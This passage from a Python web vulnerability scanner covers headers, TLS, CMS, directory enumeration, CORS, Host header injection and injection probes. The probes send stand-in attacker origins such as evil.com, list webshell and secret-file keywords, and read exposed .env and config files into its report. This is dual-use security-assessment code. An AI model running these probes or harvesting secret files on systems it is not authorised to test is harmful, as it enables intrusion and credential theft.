            if token in ck_raw: info["lang"] = lang; break

        if BS4_OK and r.text:
            soup = BeautifulSoup(r.text, "html.parser")
            gen  = soup.find("meta", attrs={"name": re.compile("generator",re.I)})
            if gen and gen.get("content"):
                info["generator"] = gen["content"]
            fws = []
            for s in soup.find_all("script", src=True):
                src = s.get("src","").lower()
                for kw, nm in [("jquery","jQuery"),("react","React"),("angular","Angular"),
                                ("vue","Vue.js"),("svelte","Svelte"),("backbone","Backbone.js"),
                                ("ember","Ember.js"),("next","Next.js"),("nuxt","Nuxt.js"),
                                ("knockout","Knockout.js"),("alpine","Alpine.js")]:
                    if kw in src and nm not in fws: fws.append(nm)
            if fws: info["js_frameworks"] = fws

        if shutil.which("whatweb"):
            try:
                out = subprocess.run(
                    ["whatweb","--no-errors","-q",self.url],
                    capture_output=True, text=True, timeout=30
                ).stdout.strip()
                if out: info["whatweb"] = out[:300]
            except Exception: pass

        self.report.info.update(info)


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: SECURITY HEADERS
# ══════════════════════════════════════════════════════════════════════════════

class HeadersAnalyser:
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("Security headers analysis")
        r = self.sess.get(self.url)
        if not r: return
        hl = {k.lower(): v for k, v in r.headers.items()}

        for hdr, meta in SECURITY_HEADERS.items():
            if hdr.lower() not in hl:
                self.report.add(Vuln(
                    name=f"Missing security header: {hdr}",
                    severity=meta["sev"], desc=meta["desc"],
                    component=self.url, evidence=f"'{hdr}' absent",
                    fix=f"Add: {meta['fix']}", refs=[meta["ref"]],
                    module="HeadersAnalyser"
                ))

        # HSTS max-age
        hsts = hl.get("strict-transport-security","")
        if hsts:
            m = re.search(r"max-age=(\d+)", hsts)
            if m and int(m.group(1)) < 31536000:
                self.report.add(Vuln(
                    name="HSTS max-age too short (< 1 year)", severity="Low",
                    desc=f"max-age={m.group(1)}s is less than 1 year.",
                    component=self.url, evidence=f"HSTS: {hsts}",
                    fix="Set max-age=31536000",refs=["https://hstspreload.org/"],
                    module="HeadersAnalyser"
                ))

        # Weak CSP
        csp = hl.get("content-security-policy","")
        if csp:
            issues = []
            if "unsafe-inline" in csp: issues.append("'unsafe-inline'")
            if "unsafe-eval"   in csp: issues.append("'unsafe-eval'")
            if re.search(r"(?:default|script)-src[^;]*\*", csp): issues.append("wildcard src")
            if issues:
                self.report.add(Vuln(
                    name=f"Weak CSP directives: {', '.join(issues)}", severity="Medium",
                    desc="CSP contains directives that weaken XSS protection.",
                    component=self.url, evidence=f"CSP: {csp[:200]}",
                    fix="Remove 'unsafe-inline', 'unsafe-eval', wildcards.",
                    refs=["https://content-security-policy.com/"],
                    module="HeadersAnalyser"
                ))

        # Insecure cookies
        for ck in r.cookies:
            flags = []
            if not ck.secure:                                     flags.append("no Secure flag")
            if not ck.has_nonstandard_attr("HttpOnly"):           flags.append("no HttpOnly flag")
            if not ck.has_nonstandard_attr("SameSite"):           flags.append("no SameSite flag")
            if flags:
                self.report.add(Vuln(
                    name=f"Insecure cookie: {ck.name}", severity="Medium",
                    desc=f"Cookie '{ck.name}': {', '.join(flags)}.",
                    component=self.url, evidence=f"Set-Cookie: {ck.name}",
                    fix="Set Secure; HttpOnly; SameSite=Strict",
                    refs=["https://owasp.org/www-community/controls/SecureCookieAttribute"],
                    module="HeadersAnalyser"
                ))

        # Cache-Control
        cc = hl.get("cache-control","")
        if "no-store" not in cc and "no-cache" not in cc:
            self.report.add(Vuln(
                name="Missing Cache-Control: no-store", severity="Info",
                desc="Responses may be cached exposing sensitive data.",
                component=self.url, evidence=f"Cache-Control: {cc or '(absent)'}",
                fix="Add: Cache-Control: no-store, no-cache, must-revalidate",
                module="HeadersAnalyser"
            ))

        # 404 soft detection
        r404 = self.sess.get(urljoin(self.url.rstrip("/")+"/","_dragon_404_probe_xyz"))
        if r404 and r404.status_code == 200:
            self.report.add(Vuln(
                name="Soft 404: server returns HTTP 200 for unknown paths", severity="Info",
                desc="Proper 404 pages not configured. May hinder security tooling.",
                component=self.url,
                fix="Configure proper error handler returning HTTP 404.",
                module="HeadersAnalyser"
            ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: SSL/TLS DEEP ANALYSIS
# ══════════════════════════════════════════════════════════════════════════════

class SSLAnalyser:
    def __init__(self, url, report: Report):
        self.url    = url
        self.report = report
        p           = urlparse(url)
        self.host   = p.hostname or ""
        self.port   = p.port or (443 if p.scheme=="https" else 80)
        self.https  = p.scheme == "https"

    def run(self):
        _status("SSL/TLS deep analysis")
        if not self.https:
            self.report.add(Vuln(
                name="Site not served over HTTPS", severity="High",
                desc="All data transmitted in cleartext over HTTP.",
                component=self.url,
                fix="Obtain TLS certificate (Let's Encrypt) and redirect HTTP→HTTPS.",
                refs=["https://letsencrypt.org/"],module="SSLAnalyser"
            ))
            # Check if HTTPS version exists
            https_url = self.url.replace("http://","https://",1)
            try:
                r = requests.get(https_url, timeout=5, verify=False)
                if r.status_code < 500:
                    self.report.add(Vuln(
                        name="HTTPS available but HTTP not redirected", severity="High",
                        desc="HTTPS endpoint exists but HTTP doesn't redirect to it.",
                        component=self.url,
                        fix="Add HTTP→HTTPS redirect (301) at server/load-balancer level.",
                        module="SSLAnalyser"
                    ))
            except Exception: pass
            return

        # Basic TLS socket probe
        ctx_strict = ssl.create_default_context()
        try:
            with socket.create_connection((self.host, self.port), timeout=5) as sock:
                with ctx_strict.wrap_socket(sock, server_hostname=self.host) as tls:
                    cert  = tls.getpeercert()
                    proto = tls.version()
                    cipher, _, bits = tls.cipher()
                    self.report.info["tls_version"] = proto
                    self.report.info["tls_cipher"]  = cipher

                    # Weak protocol
                    if proto in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
                        self.report.add(Vuln(
                            name=f"Weak TLS version in use: {proto}", severity="High",
                            desc=f"{proto} is deprecated and vulnerable to POODLE/BEAST attacks.",
                            component=f"{self.host}:{self.port}",
                            fix="Disable TLS 1.0/1.1. Require TLS 1.2+ minimum.",
                            cves=["CVE-2014-3566","CVE-2011-3389"],module="SSLAnalyser"
                        ))

                    # Weak cipher
                    if bits and bits < 128:
                        self.report.add(Vuln(
                            name=f"Weak cipher suite ({cipher}, {bits}-bit)", severity="High",
                            desc="Cipher key length below 128 bits is considered insecure.",
                            component=f"{self.host}:{self.port}",
                            fix="Configure server to use AES-256 or ChaCha20 cipher suites.",
                            module="SSLAnalyser"
                        ))
                    if cipher and any(w in cipher.upper() for w in
                                      ["RC4","DES","NULL","EXPORT","ANON","ADH"]):
                        self.report.add(Vuln(
                            name=f"Insecure cipher suite: {cipher}", severity="High",
                            desc="RC4, DES, NULL, EXPORT and anonymous ciphers are broken.",
                            component=f"{self.host}:{self.port}",
                            fix="Disable RC4, DES, NULL, EXPORT, anonymous ciphers.",
                            module="SSLAnalyser"
                        ))

                    # Certificate checks
                    if cert:
                        # Expiry
                        not_after = datetime.datetime.strptime(
                            cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
                        days_left = (not_after - datetime.datetime.utcnow()).days
                        self.report.info["cert_expiry"] = str(not_after.date())
                        self.report.info["cert_days_left"] = days_left
                        if days_left < 0:
                            self.report.add(Vuln(
                                name="TLS certificate EXPIRED", severity="Critical",
                                desc=f"Certificate expired {abs(days_left)} days ago.",
                                component=f"{self.host}:{self.port}",
                                fix="Renew certificate immediately.",module="SSLAnalyser"
                            ))
                        elif days_left < 30:
                            self.report.add(Vuln(
                                name=f"TLS certificate expiring soon ({days_left} days)",
                                severity="High",
                                desc="Certificate will expire shortly causing service disruption.",
                                component=f"{self.host}:{self.port}",
                                fix="Renew certificate ASAP.",module="SSLAnalyser"
                            ))
                        # Weak signature
                        sig_alg = cert.get("signatureAlgorithm","")
                        if sig_alg and ("md5" in sig_alg.lower() or "sha1" in sig_alg.lower()):
                            self.report.add(Vuln(
                                name=f"Weak certificate signature algorithm: {sig_alg}",
                                severity="Medium",
                                desc="MD5/SHA1 signatures are deprecated and collision-prone.",
                                component=f"{self.host}:{self.port}",
                                fix="Reissue certificate with SHA-256 or SHA-384.",
                                module="SSLAnalyser"
                            ))
        except ssl.SSLCertVerificationError as e:
            self.report.add(Vuln(
                name="TLS certificate verification failure", severity="Critical",
                desc=f"Certificate cannot be verified: {e}. MitM attacks possible.",
                component=f"{self.host}:{self.port}",
                fix="Install valid, trusted TLS certificate.",module="SSLAnalyser"
            ))
        except ssl.SSLError as e:
            self.report.add(Vuln(
                name=f"TLS handshake error: {e}", severity="Medium",
                desc="TLS negotiation failed. Possible misconfiguration.",
                component=f"{self.host}:{self.port}",module="SSLAnalyser"
            ))
        except Exception: pass

        # Test TLS 1.0 / 1.1 support
        for proto_const, name in [
            (ssl.TLSVersion.TLSv1,   "TLS 1.0"),
            (ssl.TLSVersion.TLSv1_1, "TLS 1.1"),
        ]:
            try:
                ctx_legacy = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx_legacy.check_hostname = False
                ctx_legacy.verify_mode    = ssl.CERT_NONE
                ctx_legacy.minimum_version = proto_const
                ctx_legacy.maximum_version = proto_const
                with socket.create_connection((self.host, self.port), timeout=3) as s:
                    with ctx_legacy.wrap_socket(s, server_hostname=self.host):
                        self.report.add(Vuln(
                            name=f"Deprecated TLS version accepted: {name}",
                            severity="Medium",
                            desc=f"Server accepts {name} which is deprecated by RFC 8996.",
                            component=f"{self.host}:{self.port}",
                            fix=f"Disable {name} support. Use TLS 1.2/1.3 only.",
                            cves=["CVE-2021-3449"],module="SSLAnalyser"
                        ))
            except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: CMS DETECTOR
# ══════════════════════════════════════════════════════════════════════════════

class CMSDetector:
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("CMS detection")
        r = self.sess.get(self.url)
        if not r: return
        body   = r.text.lower() if r.text else ""
        headers = {k.lower(): v.lower() for k, v in r.headers.items()}
        detected = []
        for cms, sigs in CMS_SIGS.items():
            body_match = any(s.lower() in body for s in sigs["body"])
            path_match = False
            for p in sigs["paths"]:
                pr = self.sess.get(self.url.rstrip("/")+p, allow_redirects=False,
                                   timeout=FAST_TIMEOUT)
                if pr and pr.status_code in (200,301,302,403): path_match = True; break
            if body_match or path_match:
                detected.append(cms)
                self.report.info.setdefault("cms",[]).append(cms)
                self.report.add(Vuln(
                    name=f"CMS detected: {cms}", severity="Info",
                    desc=f"{cms} CMS identified. Enables targeted CVE research.",
                    component=self.url,
                    fix="Keep CMS and all plugins up-to-date.",
                    refs=[f"https://www.cvedetails.com/product-search.php?vendor_id=0&search={cms}"],
                    module="CMSDetector"
                ))

        # WordPress specific deep check
        if "WordPress" in detected:
            self._wordpress_deep()

    def _wordpress_deep(self):
        checks = [
            ("/wp-json/wp/v2/users","Unauthenticated WordPress user enumeration",
             "High","REST API exposes usernames for all registered users."),
            ("/wp-content/debug.log","WordPress debug.log exposed","Critical",
             "Debug log may contain credentials and stack traces."),
            ("/wp-config.php.bak","WordPress wp-config.php backup exposed","Critical",
             "Backup config file may contain database credentials."),
            ("/xmlrpc.php","WordPress XMLRPC enabled","Medium",
             "XMLRPC is a common brute-force attack vector."),
        ]
        for path, name, sev, desc in checks:
            r = self.sess.get(self.url.rstrip("/")+path, allow_redirects=False,
                              timeout=FAST_TIMEOUT)
            if r and r.status_code in (200,301,302):
                self.report.add(Vuln(
                    name=name, severity=sev, desc=desc,
                    component=self.url.rstrip("/")+path,
                    fix="Disable or restrict access to this endpoint.",
                    refs=["https://wpscan.com/"],module="CMSDetector"
                ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: ROBOTS.TXT / SITEMAP ANALYSIS
# ══════════════════════════════════════════════════════════════════════════════

class RobotsAnalyser:
    SENSITIVE_KW = [
        "admin","backup","config","secret","private","internal",
        "dev","staging","old","temp","test","debug","log","sql",
        "database","credentials","passwd","password","key","token",
    ]
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("robots.txt / sitemap analysis")
        r = self.sess.get(urljoin(self.url.rstrip("/")+"/","robots.txt"))
        if r and r.status_code == 200 and "user-agent" in r.text.lower():
            disallows = re.findall(r"(?i)Disallow:\s*(.+)", r.text)
            disallows = [d.strip() for d in disallows if d.strip() and d.strip() != "/"]
            sensitive = [d for d in disallows
                         if any(k in d.lower() for k in self.SENSITIVE_KW)]
            self.report.info["robots_disallow"] = disallows[:30]
            sev = "Low" if sensitive else "Info"
            self.report.add(Vuln(
                name="robots.txt discloses path structure" + (" (sensitive paths)" if sensitive else ""),
                severity=sev,
                desc=f"Disallowed paths ({len(disallows)} total). Sensitive: {sensitive[:10]}",
                component=urljoin(self.url.rstrip("/")+"/","robots.txt"),
                evidence="\n".join(sensitive[:10]),
                fix="Avoid listing sensitive paths in robots.txt.",
                module="RobotsAnalyser"
            ))

        for sm in ("sitemap.xml","sitemap_index.xml"):
            r2 = self.sess.get(urljoin(self.url.rstrip("/")+"/",sm))
            if r2 and r2.status_code == 200 and "xml" in r2.headers.get("content-type",""):
                urls = re.findall(r"<loc>(.*?)</loc>", r2.text)
                self.report.info["sitemap_urls"] = len(urls)
                self.report.add(Vuln(
                    name=f"sitemap.xml found ({len(urls)} URLs)", severity="Info",
                    desc="Sitemap provides full URL inventory aiding reconnaissance.",
                    component=urljoin(self.url.rstrip("/")+"/",sm),
                    module="RobotsAnalyser"
                ))
                break


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: DIRECTORY ENUMERATION
# ══════════════════════════════════════════════════════════════════════════════

class DirEnum:
    def __init__(self, url, sess: Session, report: Report, fast=False):
        self.url = url; self.sess = sess; self.report = report; self.fast = fast

    def run(self) -> List[str]:
        _status("Directory & file enumeration")
        wordlist = DIR_WORDLIST[:50] if self.fast else DIR_WORDLIST
        found    = []
        def probe(path):
            target = self.url.rstrip("/") + "/" + path.lstrip("/")
            r = self.sess.get(target, allow_redirects=False,
                              timeout=FAST_TIMEOUT if self.fast else TIMEOUT)
            if r and r.status_code in (200,201,301,302,307,308,403,405):
                return (target, r.status_code, len(r.content))
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
            for res in ex.map(probe, wordlist):
                if not res: continue
                url_f, status, size = res
                path = url_f.replace(self.url,"")
                found.append(url_f)
                sev = "Info"
                if any(k in path.lower() for k in [
                    ".env","wp-config","config.php","config.yml","db.sql",
                    "backup","shell","webshell","c99","r57",".git",".svn",
                    "credentials","secrets","private_key","id_rsa"]):
                    sev = "Critical"
                elif any(k in path.lower() for k in
                         ["admin","phpinfo","xmlrpc","debug","error_log",
                          "actuator","heapdump","dump","swagger","api-docs"]):
                    sev = "High"
                elif any(k in path.lower() for k in
                         ["readme","changelog","license","composer","package.json",
                          "dockerfile","makefile","travis"]):
                    sev = "Low"
                self.report.add(Vuln(
                    name=f"Exposed path: {path} [HTTP {status}]", severity=sev,
                    desc=f"'{path}' accessible (HTTP {status}, {size}B)."
                         + (" SENSITIVE DATA EXPOSURE RISK." if sev=="Critical" else ""),
                    component=url_f, evidence=f"HTTP {status} | {size}B",
                    fix="Restrict access via web server config or remove file.",
                    refs=["https://owasp.org/www-project-top-ten/"],
                    module="DirEnum"
                ))

        # Attempt to read sensitive files if found
        for url_f in found:
            if any(k in url_f for k in [".env","config.php","config.yml",
                                          "credentials","secrets"]):
                r = self.sess.get(url_f, timeout=FAST_TIMEOUT)
                if r and r.status_code == 200 and len(r.text) < 5000:
                    self.report.add(Vuln(
                        name=f"Sensitive file contents readable: {url_f.split('/')[-1]}",
                        severity="Critical",
                        desc="Sensitive configuration file is directly readable.",
                        component=url_f,
                        evidence=r.text[:400],
                        fix="Move sensitive files outside webroot or restrict with auth.",
                        module="DirEnum"
                    ))
        return found


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: JS SECRET SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class JSScanner:
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("JavaScript secret scanning")
        r = self.sess.get(self.url)
        if not r or not BS4_OK: return
        soup    = BeautifulSoup(r.text, "html.parser")
        js_urls = set()
        for s in soup.find_all("script"):
            src = s.get("src","")
            if src:
                full = urljoin(self.url.rstrip("/")+"/", src)
                if urlparse(full).netloc == urlparse(self.url).netloc:
                    js_urls.add(full)
            if s.string:
                self._scan_content(s.string, self.url+"(inline)")
        for js_url in list(js_urls)[:30]:
            jr = self.sess.get(js_url, timeout=FAST_TIMEOUT)
            if jr and jr.status_code == 200:
                self._scan_content(jr.text, js_url)

    def _scan_content(self, content: str, source: str):
        for pattern, kind in JS_SECRET_PATTERNS:
            for m in re.finditer(pattern, content):
                val = m.group(0)[:100]
                if any(ph in val.lower() for ph in
                       ["your_","example","placeholder","xxxx","changeme","todo","test"]):
                    continue
                self.report.add(Vuln(
                    name=f"Potential {kind} exposed in JavaScript", severity="High",
                    desc=f"A {kind} pattern was found in client-side JavaScript.",
                    component=source, evidence=val,
                    fix="Never embed secrets in client-side code. Use server-side env vars.",
                    refs=["https://owasp.org/www-community/vulnerabilities/Hardcoded_Password"],
                    module="JSScanner"
                ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: CORS MISCONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════

class CORSChecker:
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("CORS misconfiguration check")
        host = urlparse(self.url).hostname or ""
        test_origins = [
            "https://evil.com","null",
            f"https://evil.{host}",
            f"https://{host}.evil.com",
            f"https://evil-{host}.com",
            "https://attacker.com",
        ]
        for origin in test_origins:
            r = self.sess.get(self.url, headers={"Origin": origin})
            if not r: continue
            acao = r.headers.get("Access-Control-Allow-Origin","")
            acac = r.headers.get("Access-Control-Allow-Credentials","")
            if acao == "*":
                self.report.add(Vuln(
                    name="CORS: Wildcard Access-Control-Allow-Origin", severity="Medium",
                    desc="Server returns 'ACAO: *', allowing any origin to read responses.",
                    component=self.url, evidence=f"ACAO: {acao}",
                    fix="Restrict CORS to specific trusted origins.",
                    refs=["https://portswigger.net/web-security/cors"],
                    module="CORSChecker"
                ))
                break
            if acao == origin or acao == "null":
                if acac.lower() == "true":
                    self.report.add(Vuln(
                        name=f"CORS: Reflected origin with credentials allowed ({origin})",
                        severity="High",
                        desc="Server reflects arbitrary origin and allows credentials. "
                             "This enables cross-origin authenticated API abuse.",
                        component=self.url,
                        evidence=f"ACAO: {acao} | ACAC: {acac}",
                        fix="Validate origin against strict whitelist. Never combine * or reflected with credentials.",
                        refs=["https://portswigger.net/web-security/cors"],
                        module="CORSChecker"
                    ))
                    break
                else:
                    self.report.add(Vuln(
                        name=f"CORS: Reflected origin ({origin})", severity="Medium",
                        desc="Server reflects arbitrary origin in ACAO header.",
                        component=self.url, evidence=f"ACAO: {acao}",
                        fix="Validate origin against strict whitelist.",
                        module="CORSChecker"
                    ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: HTTP METHOD TAMPERING
# ══════════════════════════════════════════════════════════════════════════════

class MethodTampering:
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("HTTP method tampering")
        dangerous_methods = ["PUT","DELETE","PATCH","TRACE","CONNECT","PROPFIND",
                             "PROPPATCH","MKCOL","COPY","MOVE","LOCK","UNLOCK"]
        r = self.sess.options(self.url)
        allowed_header = r.headers.get("Allow","") if r else ""
        for method in dangerous_methods:
            if method in allowed_header.upper():
                sev = "Critical" if method in ("PUT","DELETE") else "Medium"
                self.report.add(Vuln(
                    name=f"Dangerous HTTP method allowed: {method}", severity=sev,
                    desc=f"Server advertises {method} in Allow header. May enable "
                         "unauthorized file write/delete.",
                    component=self.url, evidence=f"Allow: {allowed_header}",
                    fix=f"Disable {method} in web server config if not required.",
                    refs=["https://owasp.org/www-project-web-security-testing-guide/"],
                    module="MethodTampering"
                ))

        # TRACE method - XST attack
        try:
            tr = self.sess._sess.request("TRACE", self.url, timeout=FAST_TIMEOUT)
            if tr.status_code == 200 and "TRACE" in tr.text.upper():
                self.report.add(Vuln(
                    name="TRACE method enabled (Cross-Site Tracing / XST)", severity="Low",
                    desc="TRACE method can be abused by XST attacks to steal cookies via XSS.",
                    component=self.url,
                    fix="Disable TRACE method in web server configuration.",
                    refs=["https://owasp.org/www-community/attacks/Cross_Site_Tracing"],
                    module="MethodTampering"
                ))
        except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: HOST HEADER INJECTION
# ══════════════════════════════════════════════════════════════════════════════

class HostHeaderInjection:
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("Host header injection test")
        payloads = [
            "evil.com",
            "evil.com:80",
            "evil.com:443",
            f"evil.com/{urlparse(self.url).hostname}",
        ]
        for payload in payloads:
            r = self.sess.get(self.url, headers={"Host": payload})
            if not r: continue
            body_lower = r.text.lower() if r.text else ""
            loc  = r.headers.get("Location","")
            if "evil.com" in body_lower or "evil.com" in loc:
                self.report.add(Vuln(
                    name="Host Header Injection", severity="High",
                    desc="Server reflects injected Host header value in response. "
                         "Enables password reset poisoning and cache poisoning.",
                    component=self.url, evidence=f"Host: {payload} → reflected in body/Location",
                    fix="Validate and whitelist allowed Host header values.",
                    refs=["https://portswigger.net/web-security/host-header"],
                    module="HostHeaderInjection"
                ))
                break


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: VULNERABILITY TESTER  (XSS, SQLi, SSTI, LFI, CMDi, Open Redirect)
# ══════════════════════════════════════════════════════════════════════════════

class VulnTester:
    def __init__(self, url, sess: Session, report: Report, fast=False):
        self.url = url; self.sess = sess; self.report = report; self.fast = fast
        self._params = self._extract_params()

    def _extract_params(self) -> List[Dict]:
        """Extract testable parameters from forms and URLs on the page."""
        params = []
        r = self.sess.get(self.url)
        if not r: return params

        # Existing URL params
        qs = parse_qs(urlparse(self.url).query)
        for k in qs:
            params.append({"type":"get","url":self.url,"name":k,"value":qs[k][0]})

        if not BS4_OK or not r.text: return params

        soup = BeautifulSoup(r.text, "html.parser")
        for form in soup.find_all("form"):
            action = form.get("action","")
            method = form.get("method","get").lower()
            action_url = urljoin(self.url, action) if action else self.url
            for inp in form.find_all(["input","textarea","select"]):
                name = inp.get("name","")
                val  = inp.get("value","")
                typ  = inp.get("type","text").lower()
                if name and typ not in ("submit","button","image","file","hidden"):
                    params.append({
                        "type":method,"url":action_url,
                        "name":name,"value":val or "test"
                    })
        return params

    def _inject(self, param, payload) -> Optional[requests.Response]:
        p = param.copy()
        if p["type"] == "get":
            pu = urlparse(p["url"])
            qs = parse_qs(pu.query)
            qs[p["name"]] = [payload]
            new_url = pu._replace(query=urlencode(qs,doseq=True)).geturl()
            return self.sess.get(new_url, allow_redirects=False)
        else:
            return self.sess.post(p["url"], data={p["name"]:payload},
                                  allow_redirects=False)

    def _probe_url_with_payload(self, base_url, param_name, payload) -> Optional[requests.Response]:
        """Probe a URL by appending a parameter."""
        sep = "&" if "?" in base_url else "?"
        return self.sess.get(f"{base_url}{sep}{param_name}={quote(payload)}",
                             allow_redirects=False)

    def run_all(self, output_dir=None):
        self.xss_test()
        self.sqli_test()
        self.ssti_test()
        self.lfi_test()
        self.cmd_injection_test()
        self.open_redirect_test()
        self.csrf_analysis()
        self.request_smuggling_test()
        if output_dir:
            self.clickjacking_poc(output_dir)

    # ── XSS ──────────────────────────────────────────────────────────────────
    def xss_test(self):
        _status("XSS detection")
        payloads = XSS_PAYLOADS[:5] if self.fast else XSS_PAYLOADS
        tested = set()
        # URL params
        for p in self._params[:8]:
            for payload in payloads:
                key = f"{p['url']}|{p['name']}"
                if key in tested: continue
                r = self._inject(p, payload)
                if r and payload in (r.text or ""):
                    tested.add(key)
                    self.report.add(Vuln(
                        name=f"Reflected XSS in parameter '{p['name']}'",
                        severity="High",
                        desc=f"Input parameter '{p['name']}' reflects user-supplied data "
                             "unescaped, enabling script injection.",
                        component=p["url"],
                        evidence=f"Payload reflected: {payload[:60]}",
                        fix="HTML-encode all user input in output. Implement strict CSP.",
                        refs=["https://owasp.org/www-community/attacks/xss/"],
                        cves=["CWE-79"],module="VulnTester-XSS"
                    ))
                    break
        # Path-based XSS probe
        for payload in payloads[:3]:
            r = self.sess.get(self.url.rstrip("/")+"/"+quote(payload),
                              allow_redirects=False)
            if r and payload in (r.text or ""):
                self.report.add(Vuln(
                    name="Reflected XSS in URL path", severity="High",
                    desc="URL path is reflected unescaped in response.",
                    component=self.url, evidence=f"Path payload: {payload[:60]}",
                    fix="Sanitize and encode URL path segments in output.",
                    module="VulnTester-XSS"
                ))
                break

    # ── SQLi ─────────────────────────────────────────────────────────────────
    def sqli_test(self):
        _status("SQL injection detection")
        payloads = SQLI_PAYLOADS[:5] if self.fast else SQLI_PAYLOADS
        for p in self._params[:8]:
            for payload in payloads:
                r = self._inject(p, payload)
                if not r: continue
                body_lower = (r.text or "").lower()
                if any(err in body_lower for err in SQL_ERRORS):
                    self.report.add(Vuln(
                        name=f"SQL Injection (error-based) in '{p['name']}'",
                        severity="Critical",
                        desc="SQL error message leaked in response, confirming injection point.",
                        component=p["url"],
                        evidence=f"Payload: {payload[:60]}",
                        fix="Use parameterised queries / prepared statements. Never interpolate user input.",
                        refs=["https://owasp.org/www-community/attacks/SQL_Injection"],
                        cves=["CWE-89"],module="VulnTester-SQLi"
                    ))
                    break

        # Time-based blind SQLi
        if not self.fast:
            for p in self._params[:4]:
                for payload, delay_expect, db_name in SQLI_TIME_PAYLOADS:
                    if delay_expect == 0: continue
                    t0 = time.time()
                    self._inject(p, payload)
                    elapsed = time.time() - t0
                    if elapsed >= delay_expect * 0.85:
                        self.report.add(Vuln(
                            name=f"Blind Time-Based SQL Injection (possible {db_name}) in '{p['name']}'",
                            severity="Critical",
                            desc=f"Response delayed ~{elapsed:.1f}s with time-based payload. "
                                 f"Indicates {db_name} injection.",
                            component=p["url"],
                            evidence=f"Payload: {payload} | Delay: {elapsed:.2f}s",
                            fix="Use parameterised queries. Enable WAF time-based anomaly detection.",
                            refs=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
                            cves=["CWE-89"],module="VulnTester-SQLi"
                        ))
                        break

        # Invoke sqlmap if available
        if not self.fast and shutil.which("sqlmap") and self._params:
            p = self._params[0]
            try:
                out = subprocess.run(
                    ["sqlmap","-u",p["url"],"--batch","--level=1","--risk=1",
                     "--output-dir=/tmp/sqlmap_dragon","--forms","--crawl=1","-q"],
                    capture_output=True, text=True, timeout=60
                ).stdout
                if "injection" in out.lower() or "sqlmap identified" in out.lower():
                    self.report.add(Vuln(
                        name="SQLmap confirmed SQL injection", severity="Critical",
                        desc=f"sqlmap detected SQL injection vulnerability.",
                        component=p["url"], evidence=out[:400],
                        fix="Use parameterised queries throughout the application.",
                        module="VulnTester-SQLmap"
                    ))
            except Exception: pass

    # ── SSTI ─────────────────────────────────────────────────────────────────
    def ssti_test(self):
        _status("SSTI detection")
        for p in self._params[:6]:
            for payload, expected, engine in SSTI_PAYLOADS:
                r = self._inject(p, payload)
                if r and expected in (r.text or ""):
                    self.report.add(Vuln(
                        name=f"Server-Side Template Injection ({engine}) in '{p['name']}'",
                        severity="Critical",
                        desc=f"Template expression evaluated server-side. Engine: {engine}. "
                             "Can escalate to Remote Code Execution.",
                        component=p["url"],
                        evidence=f"Payload '{payload}' → '{expected}' in response",
                        fix="Never pass user input to template rendering functions.",
                        refs=["https://portswigger.net/web-security/server-side-template-injection"],
                        cves=["CWE-94"],module="VulnTester-SSTI"
                    ))
                    break

    # ── LFI / Path Traversal ─────────────────────────────────────────────────
    def lfi_test(self):
        _status("LFI / Path Traversal detection")
        for p in self._params[:6]:
            for payload in LFI_PAYLOADS:
                r = self._inject(p, payload)
                if not r: continue
                body = r.text or ""
                if any(sig in body for sig in LFI_SIGNATURES):
                    self.report.add(Vuln(
                        name=f"Local File Inclusion / Path Traversal in '{p['name']}'",
                        severity="Critical",
                        desc="Application includes local files based on user input. "
                             "Can expose /etc/passwd, config files, or lead to RCE.",
                        component=p["url"], evidence=f"Payload: {payload}",
                        fix="Whitelist allowed file names. Never use user input in file paths.",
                        refs=["https://owasp.org/www-project-web-security-testing-guide/"],
                        cves=["CWE-22"],module="VulnTester-LFI"
                    ))
                    break

    # ── Command Injection ─────────────────────────────────────────────────────
    def cmd_injection_test(self):
        _status("Command injection probing")
        for p in self._params[:5]:
            for payload, signatures in CMD_INJECTION_PAYLOADS:
                if not signatures: continue  # skip time-based for now
                r = self._inject(p, "test" + payload)
                if not r: continue
                body = r.text or ""
                if any(sig in body for sig in signatures):
                    self.report.add(Vuln(
                        name=f"Command Injection in '{p['name']}'",
                        severity="Critical",
                        desc="User input is passed to OS shell command. "
                             "Enables full server compromise.",
                        component=p["url"],
                        evidence=f"Payload: test{payload}",
                        fix="Never pass user input to shell functions. Use allowlists.",
                        refs=["https://owasp.org/www-community/attacks/Command_Injection"],
                        cves=["CWE-78"],module="VulnTester-CMDi"
                    ))
                    break

    # ── Open Redirect ─────────────────────────────────────────────────────────
    def open_redirect_test(self):
        _status("Open redirect detection")
        tested = set()
        # From existing URL params
        for p in self._params:
            if p["name"].lower() in REDIRECT_PARAMS and p["url"] not in tested:
                tested.add(p["url"])
                for payload in OPEN_REDIRECT_PAYLOADS[:4]:
                    r = self._inject(p, payload)
                    if not r: continue
                    if r.status_code in (301,302,303,307,308):
                        loc = r.headers.get("Location","")
                        if "evil.com" in loc:
                            self.report.add(Vuln(
                                name=f"Open Redirect via '{p['name']}'",
                                severity="Medium",
                                desc="Application redirects to attacker-controlled URL. "
                                     "Enables phishing and OAuth token theft.",
